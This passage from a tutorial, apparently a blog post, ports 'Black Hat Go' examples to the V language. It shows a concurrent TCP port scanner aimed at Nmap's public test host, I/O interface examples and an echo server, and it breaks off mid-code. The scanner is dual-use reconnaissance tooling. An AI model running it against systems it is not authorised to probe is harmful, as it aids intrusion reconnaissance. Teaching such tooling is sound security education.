<h3 id="multichannel-communication">Multichannel Communication</h3>
<p>By using two threads</p>
<ul>
<li>One for sending port to worker for scanning</li>
<li>Second for receivng the result</li>
</ul>
<p>we can order the result of port scan. This also eliminates the need for <code>WaitGroup</code> as the number of inputs to and outputs from the worker pool remain constant for the batch of ports scanned. As explained better in the book <a href="https://nostarch.com/blackhatgo">Black Hat Go</a>:</p>
<blockquote>
<p>For example, if you scan 1024 ports, you’re sending on the worker channel 1024 times,and you’ll need to send the result of that work back to the main thread 1024 times. Because the number of work units sent and the number of results received are the same, your program can know when to close the channels and subsequently shut down the workers.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">module</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">net</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">worker</span>(<span style="color:#a6e22e">host</span> <span style="color:#66d9ef">string</span>, <span style="color:#a6e22e">ports</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>, <span style="color:#a6e22e">results</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>) {				<span style="color:#75715e">// worker function</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> {				
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">port</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">ports</span> <span style="color:#a6e22e">or</span> { <span style="color:#66d9ef">continue</span> } 								<span style="color:#75715e">// monitor the channel for input</span>
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">conn</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">dial_tcp</span>(<span style="color:#960050;background-color:#1e0010">&#39;$</span>{<span style="color:#a6e22e">host</span>}:<span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">port</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>) {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">conn</span>.close() <span style="color:#a6e22e">or</span> {}
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">results</span> <span style="color:#f92672">&lt;-</span> <span style="color:#a6e22e">port</span>												<span style="color:#75715e">// record the port number</span>
</span></span><span style="display:flex;"><span>		} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">results</span> <span style="color:#f92672">&lt;-</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>												<span style="color:#75715e">// -1 signifies a closed port</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">host</span> <span style="color:#f92672">:=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">scanme</span>.<span style="color:#a6e22e">nmap</span>.<span style="color:#a6e22e">org</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ports</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>{<span style="color:#a6e22e">cap</span>: <span style="color:#ae81ff">100</span>}			<span style="color:#75715e">// buffered channel to provide port number to the worker function</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">results</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>{<span style="color:#a6e22e">cap</span>: <span style="color:#ae81ff">100</span>}		<span style="color:#75715e">// buffered channel to retrieve result from worker function</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">openports</span> <span style="color:#f92672">:=</span> []<span style="color:#66d9ef">int</span>{}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">_</span> <span style="color:#a6e22e">in</span> <span style="color:#ae81ff">0.</span>.<span style="color:#a6e22e">ports</span>.<span style="color:#a6e22e">cap</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">worker</span>(<span style="color:#a6e22e">host</span>, <span style="color:#a6e22e">ports</span>, <span style="color:#a6e22e">results</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">fn</span> [<span style="color:#a6e22e">ports</span>] () {					<span style="color:#75715e">// thread to communicate ports</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">port</span> <span style="color:#a6e22e">in</span> <span style="color:#ae81ff">0..1024</span> {				
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ports</span> <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">port</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">_</span> <span style="color:#a6e22e">in</span> <span style="color:#ae81ff">0..1024</span> {					<span style="color:#75715e">// fetch back the results (in this main thread)</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">port</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&lt;-</span> <span style="color:#a6e22e">results</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">port</span> <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">openports</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#a6e22e">port</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ports</span>.close()
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">results</span>.close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">openports</span>.<span style="color:#a6e22e">sort</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">port</span> <span style="color:#a6e22e">in</span> <span style="color:#a6e22e">openports</span> {
</span></span><span style="display:flex;"><span>		println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Open</span>: <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">host</span>}:<span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">port</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><img src="./top-1024-ports-concurrent-sorted-scan.png" alt="top-1024-ports-concurrent-sorted-scan"></p>
<h2 id="building-a-tcp-proxy">Building a TCP Proxy</h2>
<p>This section first walks through a TCP <em>echo server</em> that echoes a given response back to the client. Next, we build a port forwarder and implement netcat&rsquo;s code execution features.</p>
<h3 id="using-ioreader-and-iowriter">Using io.Reader and io.Writer</h3>
<p>Similar to Go, V provides with <a href="https://modules.vlang.io/io.html#Reader"><code>io.Reader</code></a> and <a href="https://modules.vlang.io/io.html#Writer"><code>io.Writer</code></a> interfaces with a single requirement of <code>read</code> and <code>write</code> functions respectively.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// Reader represents a stream of data that can be read.</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">Reader</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// read reads up to buf.len bytes and places</span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// them into buf.</span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// A type that implements this should return</span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// `io.Eof` on end of stream (EOF) instead of just returning 0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mut</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">read</span>(<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">buf</span> []<span style="color:#a6e22e">u8</span>) !<span style="color:#66d9ef">int</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Writer is the interface that wraps the write method, which writes buf.len bytes to the underlying data stream.</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">Writer</span> {
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mut</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">buf</span> []<span style="color:#a6e22e">u8</span>) !<span style="color:#66d9ef">int</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>An example implementation of the above described interfaces can be:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">module</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">os</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">log</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">ExampleReader</span> {}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> (<span style="color:#a6e22e">r</span> <span style="color:#a6e22e">ExampleReader</span>) <span style="color:#a6e22e">read</span>(<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">buf</span> []<span style="color:#a6e22e">u8</span>) !<span style="color:#66d9ef">int</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">eprint</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">in</span>&gt; <span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">stdin</span>().<span style="color:#a6e22e">read</span>(<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">buf</span>)					<span style="color:#75715e">// os.stdin() returns an os.File struct which implements io.Reader.read() as read() for stdin</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">ExampleWriter</span> {}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> (<span style="color:#a6e22e">w</span> <span style="color:#a6e22e">ExampleWriter</span>) <span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">buf</span> []<span style="color:#a6e22e">u8</span>) !<span style="color:#66d9ef">int</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">eprint</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">out</span>&gt; <span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">stdout_handle</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">stdout</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">stdout_handle</span>.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">buf</span>)					<span style="color:#75715e">// os.stdout() returns an os.File struct which implements io.Writer.write() as write() for stdout</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">reader</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ExampleReader</span>{}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">writer</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ExampleWriter</span>{}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">buf</span> <span style="color:#f92672">:=</span> []<span style="color:#a6e22e">u8</span>{<span style="color:#a6e22e">len</span>: <span style="color:#ae81ff">4096</span>}		<span style="color:#75715e">// io.Reader and io.Writer interfaces work on basis of buf.len</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">bufLen</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">reader</span>.<span style="color:#a6e22e">read</span>(<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">buf</span>) {
</span></span><span style="display:flex;"><span>		println(<span style="color:#e6db74">&#34;Read ${bufLen} bytes from stdin.&#34;</span>)
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">fatal</span>(<span style="color:#e6db74">&#34;Unable to read data.&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">bufLen</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">writer</span>.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">buf</span>) {
</span></span><span style="display:flex;"><span>		println(<span style="color:#e6db74">&#34;Wrote ${bufLen} bytes to stdout.&#34;</span>)
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">fatal</span>(<span style="color:#e6db74">&#34;Unable to write data.&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The following is output of the program for input <code>hello\n</code></p>
<p><img src="./basic-io-wrapper.png" alt="basic-io-wrapper"></p>
<p>As copying data from Reader to Writer is a fairly common pattern, thus languages like Go and V provide a copy functionality - <a href="https://modules.vlang.io/io.html#cp"><code>cp</code></a> function can be used in V for this.</p>
<blockquote>
<p><code>cp</code> copies from <code>src</code> to <code>dst</code> by allocating a maximum of 1024 bytes buffer for reading until either EOF is reached on <code>src</code> or an error occurs. An error is returned if an error is encountered during write.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">cp</span>(<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">src</span> <span style="color:#a6e22e">Reader</span>, <span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">dst</span> <span style="color:#a6e22e">Writer</span>, <span style="color:#a6e22e">params</span> <span style="color:#a6e22e">CopySettings</span>) !
</span></span></code></pre></div><p>The <code>main()</code> function can be re-written as:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">module</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">io</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">os</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">log</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">ExampleReader</span> {}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> (<span style="color:#a6e22e">r</span> <span style="color:#a6e22e">ExampleReader</span>) <span style="color:#a6e22e">read</span>(<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">buf</span> []<span style="color:#a6e22e">u8</span>) !<span style="color:#66d9ef">int</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">eprint</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">in</span>&gt; <span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">stdin</span>().<span style="color:#a6e22e">read</span>(<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">buf</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">ExampleWriter</span> {}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> (<span style="color:#a6e22e">w</span> <span style="color:#a6e22e">ExampleWriter</span>) <span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">buf</span> []<span style="color:#a6e22e">u8</span>) !<span style="color:#66d9ef">int</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">eprint</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">out</span>&gt; <span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">stdout_handle</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">stdout</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">stdout_handle</span>.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">buf</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">reader</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ExampleReader</span>{}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">writer</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ExampleWriter</span>{}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">cp</span>(<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">reader</span>, <span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">writer</span>) <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">fatal</span>(<span style="color:#e6db74">&#34;Unable to read/write data.&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><img src="./basic-io-wrapper-2.png" alt="basic-io-wrapper-2"></p>
<h3 id="creating-an-echo-server">Creating an Echo Server</h3>
<p>V provides with <a href="https://modules.vlang.io/net.html#TcpConn"><code>TcpConn</code></a> struct which implements the <code>read()</code> and <code>write()</code> functions similar to those discussed above.</p>
<p>The function <a href="https://modules.vlang.io/net.html#listen_tcp"><code>listen_tcp()</code></a> allows to listen for connections and returns an <a href="https://modules.vlang.io/net.html#TcpListener"><code>TcpListener</code></a> object which exposes <a href="https://modules.vlang.io/net.html#TcpListener.accept"><code>accept()</code></a> function to accept connections represented as <code>TcpConn</code> object.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">module</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">net</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">log</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// process a connection from client</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">echo</span>(<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">conn</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">TcpConn</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// at the end of it all, please close the connection</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">defer</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">conn</span>.close() <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">fatal</span>(<span style="color:#e6db74">&#34;Unable to close connection.&#34;</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// buffer to store messages</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">buf</span> <span style="color:#f92672">:=</span> []<span style="color:#a6e22e">u8</span>{<span style="color:#a6e22e">len</span>: <span style="color:#ae81ff">512</span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// read from client</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">n</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">read</span>(<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">buf</span>) <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">fatal</span>(<span style="color:#e6db74">&#34;Unable to read from connection.&#34;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// validate client did not disconnect</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">n</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">info</span>(<span style="color:#e6db74">&#34;Client disconnected.&#34;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// create a slice from buffer space upto the data transferred</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">data</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">buf</span>[..<span style="color:#a6e22e">n</span>].<span style="color:#a6e22e">clone</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">info</span>(<span style="color:#e6db74">&#34;Received ${n} bytes: ${data}&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// return the data back to the client</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">info</span>(<span style="color:#e6db74">&#34;Writing back...&#34;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">data</span>) <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">fatal</span>(<span style="color:#e6db74">&#34;Unable to write to connection.&#34;</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// tell log.info() to print on `stdout` rather than `stderr`</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">use_stdout</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// port to listen on</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">port</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">20080</span>
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// create a listener</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">listener</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">listen_tcp</span>(<span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">AddrFamily</span>.<span style="color:#a6e22e">ip</span>, <span style="color:#e6db74">&#34;:${port}&#34;</span>) <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">fatal</span>(<span style="color:#e6db74">&#34;Failed to start a TCP listener on port: ${port}.&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">info</span>(<span style="color:#e6db74">&#34;Opened a TCP listener on port: ${port}.&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// infinite loop to listen and accept connections</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">conn</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">listener</span>.<span style="color:#a6e22e">accept</span>() <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">fatal</span>(<span style="color:#e6db74">&#34;Unable to accept connections.&#34;</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// handle each connection in separate thread</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">echo</span>(<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">conn</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Interacting with the echo server using <code>telnet</code> or <code>nc</code> demonstrates that the server stands up to its name.</p>
<p><img src="./echo-server.png" alt="echo-server"></p>
<p>While <code>TcpConn.read()</code> and <code>TcpConn.write()</code> provide read/write capabilities on the socket, they require manual buffer tracking and low-level calls on the connection object. This can be futher improved using a buffered I/O mechanism by levaraging the <a href="https://modules.vlang.io/io.html#BufferedReader"><code>BufferedReader</code></a> and <a href="https://modules.vlang.io/io.html#BufferedWriter"><code>BufferedWriter</code></a> structs from <code>io</code> module.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">module</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">io</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">net</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">log</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">echo</span>(<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">conn</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">TcpConn</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">defer</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">conn</span>.close() <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">fatal</span>(<span style="color:#e6db74">&#34;Unable to close connection.&#34;</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
